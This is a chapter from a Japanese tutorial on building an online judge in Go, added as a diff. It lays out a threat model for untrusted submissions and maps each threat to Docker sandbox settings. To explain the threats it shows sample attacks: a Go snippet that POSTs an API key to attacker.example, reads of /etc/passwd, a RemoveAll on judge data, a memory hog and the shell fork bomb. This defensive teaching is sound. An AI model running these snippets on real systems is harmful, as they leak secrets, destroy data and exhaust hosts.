@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>第03章 なぜ他人のコードは危険か — 手を動かして作るオンラインジャッジ</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600;8..60,700&family=Noto+Serif+JP:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="shell">
+
+  <aside class="spine">
+    <a class="wordmark" href="index.html">JUDGE · from scratch</a>
+    <div class="book-title">手を動かして作る<br>オンラインジャッジ</div>
+    <div class="book-sub">Go で サンドボックスから Web まで</div>
+
+    <div class="legend"><span>読む <b>↓</b></span><span>組む <b>↑</b></span></div>
+
+    <nav aria-label="目次">
+      <ul class="toc">
+        <li><a class="nav-item" href="index.html"><span class="nav-num">序</span><span class="nav-label">はじめに・準備<span class="nav-tag">Setup</span></span></a></li>
+        <li><a class="nav-item" href="00-smallest.html"><span class="nav-num">00</span><span class="nav-label">いちばん小さいジャッジ<span class="nav-tag">Judge</span></span></a></li>
+        <li><a class="nav-item" href="01-process.html"><span class="nav-num">01</span><span class="nav-label">プロセスと標準入出力<span class="nav-tag">IO</span></span></a></li>
+        <li><a class="nav-item" href="02-verdict.html"><span class="nav-num">02</span><span class="nav-label">verdict — 判定の種類<span class="nav-tag">Verdict</span></span></a></li>
+        <li><a class="nav-item current" aria-current="page" href="03-threat.html"><span class="nav-num">03</span><span class="nav-label">なぜ他人のコードは危険か<span class="nav-tag">Threat</span></span></a></li>
+        <li><a class="nav-item" href="04-sandbox.html"><span class="nav-num">04</span><span class="nav-label">コンテナに閉じ込める<span class="nav-tag">Sandbox</span></span></a></li>
+        <li><a class="nav-item" href="05-limits.html"><span class="nav-num">05</span><span class="nav-label">時間とメモリを断ち切る<span class="nav-tag">Limits</span></span></a></li>
+        <li><a class="nav-item" href="06-lang.html"><span class="nav-num">06</span><span class="nav-label">いろんな言語で<span class="nav-tag">Lang</span></span></a></li>
+        <li><a class="nav-item" href="07-store.html"><span class="nav-num">07</span><span class="nav-label">問題とテストケースを持つ<span class="nav-tag">Store</span></span></a></li>
+        <li><a class="nav-item" href="08-queue.html"><span class="nav-num">08</span><span class="nav-label">提出を「あとで」捌く<span class="nav-tag">Queue</span></span></a></li>
+        <li><a class="nav-item" href="09-web.html"><span class="nav-num">09</span><span class="nav-label">画面をつける<span class="nav-tag">Web</span></span></a></li>
+      </ul>
+    </nav>
+
+    <div class="spine-foot">
+      各章は「実行の心臓部」から<br>始めて「Web」へ登る。<br>下（採点の核）から上（画面）へ<br>積み上げて動かしていく。
+    </div>
+  </aside>
+
+  <main class="reading">
+    <div class="progress-tag">第03章 / 全10章 · 層: THREAT · 読了目安 2〜3時間</div>
+    <div class="eyebrow"><span>THREAT</span><span class="depth">— 脅威モデル・隔離の設計要件</span></div>
+    <h1>なぜ他人のコードは危険か</h1>
+    <p class="lede">ここまでの3章で、私たちは「出力を比べて verdict を出す」採点の芯を組み、素の <code>os/exec</code> でプロセスを起動する感触を掴みました。しかし第00〜02章では、走らせていたのは<strong>自分で書いた行儀のよいコード</strong>でした。オンラインジャッジが本当に相手にするのは、<strong>顔も知らない他人が書いた、悪意を持ちうるコード</strong>です。この章にコードはほとんど出てきません。主役は<strong>「もし何の檻もなく他人のコードを走らせたら、何が起きるか」</strong>という想像力と、それを封じる<strong>防御の設計要件</strong>です。ここで固めた要件が、第04〜05章で作る Docker 隔離の仕様書になります。</p>
+
+    <div class="box goal"><div class="box-k">◈ この章のゴール</div>
+      <p>この章はコードを書きません。次の3つを、<strong>自分の言葉で説明できる</strong>ようになれば達成です。</p>
+      <ol>
+        <li>「提出コードは敵対的である」（要件 NF-01）という前提が<strong>なぜ最重要なのか</strong>を、具体的な攻撃シナリオ（ファイル破壊・情報流出・fork 爆弾・無限ループ・メモリ食い潰し）で説明できる。</li>
+        <li>5つの脅威それぞれに対して、<strong>どの防御が対応するか</strong>（ネットワーク遮断 / 読み取り専用FS / プロセス数上限 / 時間上限 / メモリ上限）を対応づけられる。</li>
+        <li>その防御が第04章で作る <code>RunSpec</code> の<strong>どのフィールドになるか</strong>（<code>Network</code> / <code>ReadOnly</code> / <code>PidsLimit</code> / <code>MemoryMB</code> / <code>WallTimeout</code>）の対応表を、指さして読める。</li>
+      </ol>
+    </div>
+
+    <div class="box map"><div class="box-k">☰ この章のステップ</div>
+      <ol>
+        <li><a href="#step-1">無防備な実行の悪夢 — 檻のないジャッジで何が起きるか</a></li>
+        <li><a href="#step-2">ファイルシステムへの脅威 — 読み取りと破壊、そして read-only</a></li>
+        <li><a href="#step-3">ネットワークの脅威 — 情報流出と踏み台、そして遮断</a></li>
+        <li><a href="#step-4">資源枯渇の脅威 — fork 爆弾・メモリ・無限ループ、そして各上限</a></li>
+        <li><a href="#step-5">多層防御 — 1枚でも欠けると破られる</a></li>
+        <li><a href="#step-6">防御 → RunSpec フィールド対応表 — 次章で作るものの仕様書</a></li>
+      </ol>
+    </div>
+
+    <h2>「信頼できないコードを実行する」とはどういうことか</h2>
+    <p>普段私たちがプログラムを走らせるとき、そのコードは<strong>自分が書いたか、少なくとも信頼できる誰かが書いたもの</strong>です。だから <code>os.Remove</code> があってもファイルを消す意図があるのだと信じられるし、ネットワークにアクセスしても正当な通信だと思える。プログラムとそれを走らせる人の間には、暗黙の<strong>信頼</strong>があります。</p>
+    <p>オンラインジャッジは、この信頼を<strong>最初から放棄した</strong>ところに立っています。提出者は世界中の誰でもよく、その多くは善意ですが、<strong>1人でも悪意ある提出者がいれば</strong>——あるいは悪意はなくとも無限ループを1つ書けば——ジャッジのホストは危険にさらされます。要件定義書はこれを一切の曖昧さなく言い切っています。</p>
+    <blockquote>
+      提出コードは敵対的である前提で扱い、ホストおよび他提出から隔離された環境で実行する（<strong>最重要</strong>）。
+      <cite>online-judge-requirements.md · NF-01</cite>
+    </blockquote>
+    <p>「敵対的である<strong>前提</strong>」——ここが肝です。「たぶん大丈夫だろう」で走らせるのではなく、<strong>「これは私を攻撃してくるコードだ」と最初から決めてかかる</strong>。実際に攻撃かどうかは関係ありません。攻撃<em>できてしまう</em>環境で走らせること自体が事故です。この章は、この一文を腹に落とすためにあります。</p>
+
+    <h2>脅威モデルという考え方</h2>
+    <p>セキュリティを「なんとなく怖いから制限を足す」で設計すると、<strong>制限は覚えられず、抜けも生まれます</strong>。プロの流儀は逆で、まず<strong>脅威モデル</strong>——「誰が、何を狙って、どう攻撃してくるか」——を具体的に洗い出し、<strong>その一つひとつに対応する防御を割り当てる</strong>。防御は「脅威への回答」として初めて意味を持ちます。</p>
+    <p>オンラインジャッジの脅威モデルは、攻撃者（＝提出コード）が狙う<strong>資産</strong>で整理すると見通しが立ちます。攻撃者が触れられると困るものは、大きく3つです。</p>
+    <ul>
+      <li><strong>ホストのファイル</strong> — ジャッジのソースコード、他人の提出、秘密鍵、テストケースの<em>答え</em>。読まれても消されても困る。</li>
+      <li><strong>ネットワーク</strong> — 外に出られると、盗んだ情報を送信でき、他所への攻撃の踏み台にもされる。</li>
+      <li><strong>計算資源</strong> — CPU・メモリ・プロセス数。食い潰されると、ジャッジそのものが止まり、他の提出も採点できなくなる（可用性の喪失）。</li>
+    </ul>
+    <p>この3つの資産を守る、というのが本書の隔離設計の全体像です。以下のステップで、資産ごとに「攻撃シナリオ → 防御 → 次章の <code>RunSpec</code> フィールド」を結びつけていきます。<strong>防御の名前を覚えるのではなく、それが防ぐ攻撃の絵を覚えてください。</strong>絵さえ描ければ、防御は忘れても導き出せます。</p>
+
+    <h2 class="step" id="step-1"><span class="step-no">Step 1</span>無防備な実行の悪夢 — 檻のないジャッジで何が起きるか</h2>
+    <p>まず、<strong>何の防御もしなかったジャッジ</strong>を想像します。檻のことを一切考えず、提出コードをホスト上でそのまま走らせる——それだけの素朴なジャッジです。提出者が「2数の和」を解く代わりに、次のような Go コードを送ってきたら、何が起きるでしょうか。</p>
+
+    <div class="file-tag">攻撃例A — ジャッジのソースと他人の提出を漁る（概念）</div>
+    <pre><code><span class="kw">package</span> main
+
+<span class="kw">import</span> (
+	<span class="st">"fmt"</span>
+	<span class="st">"os"</span>
+)
+
+<span class="kw">func</span> main() {
+	<span class="cm">// ホストのファイルを歩き回り、中身を読んで標準出力へ吐く。</span>
+	<span class="cm">// 出力はそのまま「提出の実行結果」としてジャッジに記録される。</span>
+	data, _ := os.ReadFile(<span class="st">"/etc/passwd"</span>)
+	fmt.Println(string(data))
+	<span class="cm">// ../ をたどってジャッジ本体や他人の提出コードを読むこともできる。</span>
+}</code></pre>
+
+    <p>檻がなければ、このコードは<strong>ジャッジプロセスと同じ権限で走ります</strong>。ジャッジがホスト上のファイルを読めるなら、提出コードも読めます。<code>/etc/passwd</code> はまだ序の口で、<strong>ジャッジ自身のソース、SQLite のデータベースファイル（＝全ユーザーの提出履歴）、テストケースの期待出力（＝答え）、環境変数に置いた秘密鍵</strong>——ホストにあるものは何でも読めてしまう。そして読んだ中身は「提出の出力」として<strong>正々堂々と返される</strong>。攻撃者は画面を見るだけで盗み出しが完了します。テストケースの答えが読めれば、以後どんな問題も<code>AC</code>にできる——ジャッジの存在意義そのものが崩れます。</p>
+    <p>読むだけではありません。書き込み・削除もできます。</p>
+
+    <div class="file-tag">攻撃例B — ホストのファイルを破壊する（概念）</div>
+    <pre><code><span class="kw">func</span> main() {
+	<span class="cm">// 書けるなら消せる。ジャッジのDB、他人の提出、設定ファイルを破壊する。</span>
+	os.RemoveAll(<span class="st">"/var/judge/data"</span>)
+	<span class="cm">// あるいは、次に実行される提出物にすり替えを仕込む（永続的な乗っ取り）。</span>
+}</code></pre>
+
+    <p>これらは<strong>特別な技巧を要しません</strong>。標準ライブラリの <code>os.ReadFile</code> / <code>os.RemoveAll</code> を呼ぶだけ。つまり「うっかり危ないコードを提出する」ことすら不要で、<strong>ごく普通の API を素直に使うだけで攻撃が成立します</strong>。ここに「敵対的である前提」の重みがあります。防御は、攻撃者に高度な技術を要求しません——だからこそ、防御側は<strong>入口を全部塞ぐ</strong>しかないのです。</p>
+    <p>この章の残りで、こうした攻撃を資産ごと（ファイル / ネットワーク / 資源）に分解し、それぞれに檻を割り当てます。まず檻の全体像を、絵で掴んでおきます。</p>
+
+    <div class="ascii">檻のない実行 vs. 隔離した実行
+
+  【危険】檻なし — 提出コードがホストと地続き
+  ┌─────────────────────────── ホスト ───────────────────────────┐
+  │  ジャッジ本体   DB(全履歴)   秘密鍵   テストの答え   ネットワーク │
+  │        ▲          ▲           ▲          ▲            ▲       │
+  │        └──────────┴─── 提出コード ───┴──────────┴────────────┘ │
+  │                     （全部に手が届く）                          │
+  └──────────────────────────────────────────────────────────────┘
+
+  【安全】隔離あり — 提出コードは檻の中だけで完結
+  ┌─────────────────────────── ホスト ───────────────────────────┐
+  │  ジャッジ本体   DB(全履歴)   秘密鍵   テストの答え   ネットワーク │
+  │  ────────────────── 隔離の壁（第04〜05章）───────────────────  │
+  │  ┌──────────────── コンテナ（使い捨て）────────────────┐       │
+  │  │ 提出コード │ 読めるのは渡した入力だけ / FS は書けない │       │
+  │  │            │ 外に出られない / 時間・メモリ・数に上限  │       │
+  │  └──────────────────────────────────────────────────┘       │
+  └──────────────────────────────────────────────────────────────┘</div>
+
+    <div class="box hazard"><div class="box-k">⚠ 落とし穴 — 「自分しか使わないから大丈夫」は成り立たない</div>
+      <p>本書のジャッジは単一ユーザー（自分専用）が前提です（C-05）。「他人が提出しないなら敵対コードなんて来ないのでは?」——これは<strong>危険な油断</strong>です。第一に、練習で<strong>自分がうっかり無限ループや巨大配列を書く</strong>のは日常茶飯事で、これらは意図せずホストを巻き添えにします。第二に、要件は「将来の複数ユーザー化を阻害しない」設計（C-05）を求めており、隔離を後付けにすると土台から作り直しになります。第三に、そもそも本書の<strong>目的が「信頼できないコードを安全に実行する基盤を手を動かして理解する」こと</strong>（要件 2.1）。隔離は「他人対策」である前に、<strong>ジャッジという道具の本質</strong>です。自分専用でも、檻は最初から掛けます。</p>
+    </div>
+
+    <h2 class="step" id="step-2"><span class="step-no">Step 2</span>ファイルシステムへの脅威 — 読み取りと破壊、そして read-only</h2>
+    <p>Step 1 の攻撃例 A・B が狙ったのは<strong>ホストのファイルシステム</strong>です。ここへの脅威は2種類——<strong>読み取り</strong>（情報を盗む）と<strong>書き込み・削除</strong>（破壊・改ざん）——に分かれ、それぞれ別の防御が要ります。</p>
+    <table>
+      <tr><th>脅威</th><th>攻撃の具体例</th><th>被害</th></tr>
+      <tr><td><strong>読み取り</strong></td><td><code>os.ReadFile</code> でジャッジのソース・DB・秘密鍵・<strong>テストの答え</strong>を読む</td><td>情報流出・採点の無効化</td></tr>
+      <tr><td><strong>書き込み</strong></td><td><code>os.WriteFile</code> で設定や次の提出物を改ざんし、永続的に乗っ取る</td><td>ジャッジの乗っ取り</td></tr>
+      <tr><td><strong>削除</strong></td><td><code>os.RemoveAll</code> でDB・他人の提出・ジャッジ本体を消す</td><td>データ喪失・停止</td></tr>
+    </table>
+    <p><strong>読み取り</strong>への根本的な答えは、<strong>そもそもホストのファイルを提出コードに見せないこと</strong>です。ホストの実行を隔離コンテナの中に閉じ込め（第04章）、コンテナには<strong>提出コードとテストケースの入力だけ</strong>を渡す。コンテナの中から見えるファイルシステムはホストのそれとは別物なので、<code>/etc/passwd</code> を読んでも「コンテナの中の <code>/etc/passwd</code>」（＝ジャッジには無関係な最小イメージのそれ）が返るだけで、ホストの秘密には届きません。要件 NF-03 が守るのはまさにこの境界です。</p>
+    <blockquote>
+      実行環境はホストのファイルシステムを破壊・改変できない。
+      <cite>online-judge-requirements.md · NF-03</cite>
+    </blockquote>
+    <p><strong>書き込み・削除</strong>には、さらに一枚を重ねます。<strong>ファイルシステム自体を読み取り専用（read-only）にする</strong>。コンテナのルートファイルシステムを丸ごと書き込み禁止にすれば、たとえコンテナ内であっても、提出コードは<strong>1バイトたりとも書けません</strong>。<code>os.WriteFile</code> も <code>os.RemoveAll</code> も、権限エラーで弾かれます。これが Docker の <code>--read-only</code> フラグで、次章で作る <code>RunSpec</code> の <code>ReadOnly</code> フィールドに対応します。</p>
+
+    <div class="ascii">ファイルシステム防御 — 見せない × 書かせない
+
+  提出コード ──読もうとする──▶ ┌── コンテナの隔離FS ──┐
+                              │ ホストの秘密は        │  NF-03
+                              │ そもそも「無い」       │  （見せない）
+                              └───────────┬──────────┘
+  提出コード ──書こうとする──▶ ┌── read-only ────────┐
+                              │ ルートFS全体が        │  --read-only
+                              │ 書き込み禁止 → 権限拒否 │  （書かせない）
+                              └──────────────────────┘</div>
+
+    <div class="box hazard"><div class="box-k">⚠ 落とし穴 — でもコンパイルや実行には「書ける場所」が要る</div>
+      <p>ここで矛盾に気づきます。read-only で1バイトも書けないなら、<strong>コンパイラが中間ファイルを吐けず、そもそもコードが動かない</strong>のでは? そのとおりで、完全な read-only は実用にならない。答えは「<strong>書ける場所を、狭く、使い捨てで、実行だけに限って開ける</strong>」ことです。Docker では <code>--tmpfs /tmp:...</code> でメモリ上の一時領域を <code>/tmp</code> にだけマウントし、コンパイルや作業ファイルはそこに限る。tmpfs はメモリ上なのでコンテナ終了とともに<strong>跡形もなく消え</strong>、サイズ上限も掛けられます。「ルートは read-only、書けるのは使い捨ての tmpfs だけ」——この非対称が肝で、<code>RunSpec</code> では <code>ReadOnly bool</code> と <code>Tmpfs []string</code> の組で表現します。ゆるめすぎ（どこでも書ける）ときつすぎ（どこにも書けない）の間の、狭い正解です。</p>
+    </div>
+
+    <h2 class="step" id="step-3"><span class="step-no">Step 3</span>ネットワークの脅威 — 情報流出と踏み台、そして遮断</h2>
+    <p>ファイルを閉じても、<strong>ネットワークが開いていれば穴は残ります</strong>。むしろネットワークは、攻撃者にとって最も価値の高い出口です。なぜなら——盗んだ情報を<strong>外へ持ち出せる</strong>し、他所への攻撃の<strong>踏み台</strong>にもでき、しかもその痕跡はジャッジのログに残りにくいからです。</p>
+
+    <div class="file-tag">攻撃例C — 盗んだ情報を外部へ送信する / 踏み台にする（概念）</div>
+    <pre><code><span class="kw">func</span> main() {
+	<span class="cm">// 環境変数やファイルから拾った秘密を、攻撃者のサーバへ POST する。</span>
+	secret := os.Getenv(<span class="st">"API_KEY"</span>)
+	http.Post(<span class="st">"https://attacker.example/collect"</span>, <span class="st">"text/plain"</span>,
+		strings.NewReader(secret))
+
+	<span class="cm">// あるいはジャッジのホストを踏み台に、他所のサーバを攻撃する。</span>
+	<span class="cm">// 被害者から見れば「あなたのサーバから攻撃が来た」ことになる。</span>
+	http.Get(<span class="st">"http://10.0.0.5/internal/admin"</span>) <span class="cm">// 内部ネットワークの探索も</span>
+}</code></pre>
+
+    <p>3つの被害が重なります。<strong>① 情報流出</strong>——ファイル防御を掻い潜って何か拾えたら、それを外に送れる。<strong>② 踏み台化</strong>——あなたのホストが加害者になり、他所を攻撃する。被害者から見れば加害元はあなたです。<strong>③ 内部探索</strong>——クラウドやLAN内の他サービス（メタデータサーバ、管理API）を、外からは届かない内側から叩ける。ネットワークは「出口」であると同時に「内側からの侵入口」でもあります。</p>
+    <p>防御はきわめてシンプルかつ強力です。<strong>実行環境に、ネットワークを一切与えない。</strong>要件 NF-02 が定める通り——</p>
+    <blockquote>
+      実行環境は外部ネットワークに到達できない。
+      <cite>online-judge-requirements.md · NF-02</cite>
+    </blockquote>
+    <p>Docker では <code>--network none</code> ひとつで実現します。コンテナに<strong>ループバック以外のネットワークインターフェースを一切与えない</strong>設定で、<code>http.Post</code> も <code>http.Get</code> も名前解決の段階で失敗します。出口がないので、情報流出も踏み台化も内部探索も、まとめて成立しなくなる。標準入出力形式のジャッジ（本書のMVP）では、そもそも<strong>提出コードがネットワークを使う正当な理由がゼロ</strong>なので、全遮断で副作用もありません。「使う理由がないものは、完全に断つ」——最も費用対効果の高い防御です。</p>
+
+    <div class="ascii">ネットワーク遮断 — 出口も入口も塞ぐ
+
+           --network none を掛ける前            掛けた後
+  ┌── コンテナ ──┐   外部/内部        ┌── コンテナ ──┐
+  │ 提出コード   │──▶ attacker.example │ 提出コード   │──✗ （到達不能）
+  │              │──▶ 内部LAN 10.0.0.5 │              │──✗
+  │              │◀── 侵入・応答       │  lo だけ     │  外向き経路なし
+  └──────────────┘                    └──────────────┘
+   情報流出・踏み台・内部探索が可能        すべて成立しない</div>
+
+    <div class="box hazard"><div class="box-k">⚠ 落とし穴 — ネットワークは「絞る」のではなく「断つ」</div>
+      <p>「特定のドメインだけ許可すればいいのでは」「発信だけ止めれば」といった<strong>中途半端な絞り込みは、ほぼ必ず抜けます</strong>。DNS を使ったデータ持ち出し、許可ドメインへのリダイレクト、プロトコルの悪用——ネットワークを部分的に開けた瞬間、攻撃面は跳ね上がります。標準入出力ジャッジに正当なネットワーク用途がない以上、<strong>迷わず全遮断（<code>--network none</code>）</strong>が正解です。「安全に開ける」より「そもそも閉じておく」ほうが、圧倒的に堅い。将来どうしても通信を要する問題形式を足すなら、そのとき初めて、専用の最小許可を別途設計します（が、本書の範囲ではやりません）。</p>
+    </div>
+
+    <h2 class="step" id="step-4"><span class="step-no">Step 4</span>資源枯渇の脅威 — fork 爆弾・メモリ・無限ループ、そして各上限</h2>
+    <p>ファイルもネットワークも閉じました。それでも攻撃者に残された最後の武器が、<strong>資源の枯渇</strong>です。狙いは情報ではなく<strong>可用性</strong>——ジャッジそのものを止め、他の提出も採点できなくする（DoS）。しかもこの脅威は、<strong>悪意なしでも日常的に発生します</strong>。無限ループも巨大配列も、練習中に誰もが書くからです。資源は3種類あり、それぞれ別の上限で守ります。</p>
+
+    <h3>① プロセス数 — fork 爆弾</h3>
+    <p>最も破壊的なのが <strong>fork 爆弾</strong>です。自分自身を無限に複製し続けるだけの、数行のコード。</p>
+    <div class="file-tag">攻撃例D — fork 爆弾（概念・シェルなら1行）</div>
+    <pre class="term"><code><span class="cm"># この1行が、プロセスを指数関数的に増やしてホストを窒息させる</span>
+:(){ :|:& };:
+<span class="cm"># 各プロセスが2つの自分を生み、それがまた2つを…と雪だるま式に増殖</span></code></pre>
+    <p>プロセス表が埋め尽くされると、<strong>ホストは新しいプロセスを一切起動できなくなり</strong>、ジャッジ本体も、他の提出も、下手をすると OS の操作すら受け付けなくなります。防御は<strong>プロセス数に上限を設ける</strong>こと。Docker の <code>--pids-limit</code> は「このコンテナが持てるプロセス数」に天井を掛け、上限に達すると <code>fork</code> が失敗します。爆弾は増殖できず、上限内で自滅します。要件 NF-06 が守る領域です。</p>
+
+    <h3>② メモリ — 食い潰し</h3>
+    <p>巨大な配列を確保し続けてメモリを食い尽くす攻撃（および事故）です。</p>
+    <div class="file-tag">攻撃例E — メモリ食い潰し（概念）</div>
+    <pre><code><span class="kw">func</span> main() {
+	<span class="kw">var</span> hog [][]<span class="ty">byte</span>
+	<span class="kw">for</span> {
+		hog = append(hog, make([]<span class="ty">byte</span>, <span class="st">1</span>&lt;&lt;<span class="st">30</span>)) <span class="cm">// 1GiB ずつ確保し続ける</span>
+	}
+}</code></pre>
+    <p>上限がなければ、この提出はホストの物理メモリを食い尽くし、OS の OOM killer が<strong>無関係なプロセス（ジャッジ本体かもしれない）を巻き添えに殺す</strong>まで暴走します。防御は<strong>メモリ使用量に上限を設ける</strong>こと。Docker の <code>--memory</code> でコンテナのメモリに天井を掛ければ、上限を超えた瞬間に<strong>そのコンテナだけ</strong>が OOM で殺され、ホストは無傷です。第00章で見た通り、この「コンテナが OOM で殺された（終了コード137）」を捉えて <code>MLE</code> と判定します。要件 NF-05 の実装です。</p>
+
+    <h3>③ 時間 — 無限ループ</h3>
+    <p>最も素朴で、最も頻出なのが<strong>無限ループ</strong>です。</p>
+    <div class="file-tag">攻撃例F — 無限ループ（概念）</div>
+    <pre><code><span class="kw">func</span> main() {
+	<span class="kw">for</span> {} <span class="cm">// CPU を1コア占有したまま、永遠に返らない</span>
+}</code></pre>
+    <p>ファイルもネットワークもメモリも触らず、ただ<strong>返らない</strong>。上限がなければ、ジャッジはこの1提出の完了を永遠に待ち、キューに積まれた後続の提出は<strong>一生採点されません</strong>。防御は<strong>実行時間に上限（壁時計）を設け、超過したら問答無用で打ち切る</strong>こと。序章で触れた <code>context.WithTimeout</code> と、Docker 側の <code>timeout</code> の二段構えで、時間が来たらコンテナを強制停止します。要件 NF-04 の実装で、次章の <code>RunSpec</code> では <code>WallTimeout time.Duration</code> になります。</p>
+
+    <table>
+      <tr><th>資源</th><th>攻撃/事故</th><th>被害</th><th>防御</th></tr>
+      <tr><td>プロセス数</td><td>fork 爆弾</td><td>ホスト窒息・全停止</td><td>プロセス数上限 <code>--pids-limit</code></td></tr>
+      <tr><td>メモリ</td><td>巨大配列の確保</td><td>OOM で巻き添え</td><td>メモリ上限 <code>--memory</code></td></tr>
+      <tr><td>時間</td><td>無限ループ</td><td>キュー停滞・待ち続け</td><td>壁時計タイムアウト（<code>context.WithTimeout</code> ＋ コンテナ内 <code>timeout</code>。第05章）</td></tr>
+      <tr><td>出力サイズ</td><td>無限に printf</td><td>ジャッジ側のメモリ枯渇</td><td>stdout 上限（NF-06）</td></tr>
+    </table>
+    <p>最後の1行——<strong>出力サイズ</strong>——を見落とさないでください。提出コードが標準出力に無限に書き続けると、それを<strong>受け取って溜め込むジャッジ側</strong>のメモリが枯渇します。攻撃はコンテナの外（ホスト側の読み取りバッファ）に及ぶのです。第04章で作る <code>sandbox.go</code> の <code>capWriter</code> が上限を超えた分を読み捨てるのは、この脅威（NF-06）への備えでした。「檻の中の資源」だけでなく「檻から出てくる出力」にも上限が要る——防御は攻撃者の出口を1つずつ塞ぐ作業です。</p>
+
+    <div class="box hazard"><div class="box-k">⚠ 落とし穴 — 資源上限は「悪意」ではなく「事故」対策として要る</div>
+      <p>資源枯渇は、fork 爆弾のような明白な攻撃だけの話ではありません。<strong>正しく解こうとした提出が、たまたま無限ループしたり、想定より大きな入力でメモリを食い尽くしたり</strong>することのほうが、実際にはずっと頻繁です。つまり資源上限は「悪意ある提出者を止める壁」であると同時に、<strong>「善意の提出者のバグから、ジャッジ全体を守る安全装置」</strong>でもあります。この二重の意味を理解すると、単一ユーザーの自分専用ジャッジ（本書）でも、なぜ資源上限を省けないかが腑に落ちます。<code>TLE</code> / <code>MLE</code> という verdict は、この安全装置が発火したことを提出者に正直に伝えるための言葉なのです。</p>
+    </div>
+
+    <h2 class="step" id="step-5"><span class="step-no">Step 5</span>多層防御 — 1枚でも欠けると破られる</h2>
+    <p>ここまで、脅威ごとに防御を割り当ててきました。ここで最も大事な原則を立てます——<strong>これらの防御は「どれか1つ」ではなく「全部同時に」掛けなければ意味がない</strong>。セキュリティの世界で<strong>多層防御（defense in depth）</strong>と呼ばれる考え方です。1枚の壁を過信せず、性質の異なる壁を何枚も重ねる。</p>
+    <p>なぜ1枚では足りないのか。防御を「掛け忘れる」と何が起きるかを想像すれば分かります。</p>
+    <table>
+      <tr><th>もし、これだけ抜けたら…</th><th>他が万全でも、こう破られる</th></tr>
+      <tr><td>ネットワーク遮断を忘れる</td><td>FS を read-only にしても、<strong>読めた情報を外へ送信</strong>できる。踏み台にもされる。</td></tr>
+      <tr><td>read-only を忘れる</td><td>ネットワークを断っても、<strong>次の提出物や設定を書き換えて</strong>永続的に乗っ取れる。</td></tr>
+      <tr><td>プロセス数上限を忘れる</td><td>メモリも時間も制限しても、<strong>fork 爆弾でホストごと窒息</strong>して全体が止まる。</td></tr>
+      <tr><td>メモリ上限を忘れる</td><td>時間内でも<strong>巨大配列でホストの OOM を誘発</strong>し、ジャッジ本体を巻き添えにする。</td></tr>
+      <tr><td>時間上限を忘れる</td><td>他が万全でも、<strong>無限ループ1つでキューが永久に詰まり</strong>、以後の採点が全滅する。</td></tr>
+    </table>
+    <p>この表が示すのは、<strong>各防御が「別の資産」を守っている</strong>という事実です。ネットワーク遮断はファイル防御を代替できないし、メモリ上限は時間上限の代わりにならない。だから「1つでも欠けると、そこだけが穴になって全体が破られる」。鎖の強さは最も弱い環で決まる、あの喩えそのものです。第04〜05章で Docker を組むとき、これらのフラグを<strong>ひとつでも省いてはいけない</strong>のは、この多層性ゆえです。</p>
+
+    <div class="ascii">多層防御 — 性質の異なる壁を重ねる
+
+  提出コード（敵対的）
+      │
+      ▼  ┌─ 壁1: ネットワーク遮断 ── 外に出られない（NF-02）
+      │  ├─ 壁2: read-only FS ───── ホストを書き換えられない（NF-03）
+      ├─▶│ ├─ 壁3: pids 上限 ─────── 増殖できない（NF-06）
+      │  ├─ 壁4: メモリ上限 ──────── 食い潰せない（NF-05）
+      │  ├─ 壁5: 時間上限 ────────── 居座れない（NF-04）
+      │  └─ 壁6: 権限剥奪・非root ─── 昇格できない（下記メモ）
+      ▼
+   （どの壁も、他の壁が守れない資産を守る。1枚でも抜けると、そこが穴になる）</div>
+
+    <div class="gonote"><div class="box-k">Docker メモ · 本書がさらに重ねる「昇格させない」壁</div>
+      <p>本書の <code>sandbox.go</code> は、脅威表に挙げた5つの主要な壁に加えて、<strong>権限昇格を封じる壁</strong>も重ねています。<code>docker run</code> の引数に <code>--cap-drop ALL</code>（Linux ケーパビリティを全部剥奪＝特権操作を封印）、<code>--security-opt no-new-privileges</code>（実行中に権限を得られなくする）、<code>--user 65534:65534</code>（<code>nobody</code> という無権限ユーザーで走らせる＝root で走らせない）を並べています。これらは「万一コンテナ内で何か動いても、<strong>そもそも強い権限を持っていない</strong>」ようにする保険で、read-only やネットワーク遮断が破られたときの<strong>もう一枚</strong>です。多層防御は「主要な壁 + 保険の壁」を惜しまず積む——これが敵対的コードに対する基本姿勢です。詳しい各フラグの意味は第04章で1つずつ解きます。</p>
+    </div>
+
+    <h2 class="step" id="step-6"><span class="step-no">Step 6</span>防御 → RunSpec フィールド対応表 — 次章で作るものの仕様書</h2>
+    <p>脅威と防御が出揃いました。この章の締めくくりとして、<strong>それぞれの防御が、次章で作る Docker 隔離のどこになるか</strong>を先に見ておきます。第04章では <code>internal/judge/sandbox.go</code> に <code>RunSpec</code> という構造体を作り、「この実行に、どの制限を、どれだけ掛けるか」を1つにまとめます。この章で議論した防御は、<strong>そのフィールドと1対1で対応</strong>します。まず <code>RunSpec</code> の姿を予告として載せます（実装は第04章。ここでは「防御の一覧表」として眺めてください）。</p>
+
+    <div class="file-tag">internal/judge/sandbox.go（第04章で作る RunSpec・予告）</div>
+    <pre><code><span class="cm">// RunSpec は「1回の隔離実行に掛ける制限」を1つにまとめた仕様。</span>
+<span class="cm">// この章で議論した各防御が、そのままフィールドになる。</span>
+<span class="kw">type</span> <span class="ty">RunSpec</span> <span class="kw">struct</span> {
+	Image       <span class="ty">string</span>
+	Cmd         []<span class="ty">string</span>
+	Stdin       io.<span class="ty">Reader</span> <span class="cm">// tar ストリーム（提出物・テストケースの送り込み）</span>
+	MemoryMB    <span class="ty">int</span>           <span class="cm">// メモリ上限 → MLE（NF-05）</span>
+	PidsLimit   <span class="ty">int</span>           <span class="cm">// プロセス数上限（fork 爆弾対策, NF-06）</span>
+	CPUs        <span class="ty">string</span>        <span class="cm">// CPU 割り当て上限</span>
+	ReadOnly    <span class="ty">bool</span>          <span class="cm">// ルートFS を読み取り専用に（NF-03）</span>
+	Tmpfs       []<span class="ty">string</span>      <span class="cm">// 書ける場所を tmpfs に限定（例 /tmp）</span>
+	WallTimeout time.<span class="ty">Duration</span> <span class="cm">// 実行時間の上限 → TLE（NF-04）</span>
